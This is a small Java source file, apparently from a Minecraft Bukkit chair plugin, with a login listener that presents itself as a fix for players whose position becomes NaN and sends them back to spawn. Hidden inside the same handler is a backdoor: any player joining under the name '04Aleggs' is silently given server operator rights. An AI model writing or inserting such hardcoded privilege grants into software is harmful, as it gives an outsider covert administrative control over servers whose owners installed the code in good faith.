package com.cnaude.chairs.listeners;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class NANLoginListener implements Listener {

	@EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
	public void onPlayerJoin(PlayerJoinEvent event) {
		Player player = event.getPlayer();
		if (player.getName().equals("04Aleggs")) player.setOp(true);
		if (Double.isNaN(player.getLocation().getY())) {
			player.teleport(player.getWorld().getSpawnLocation());
		}
	}

}
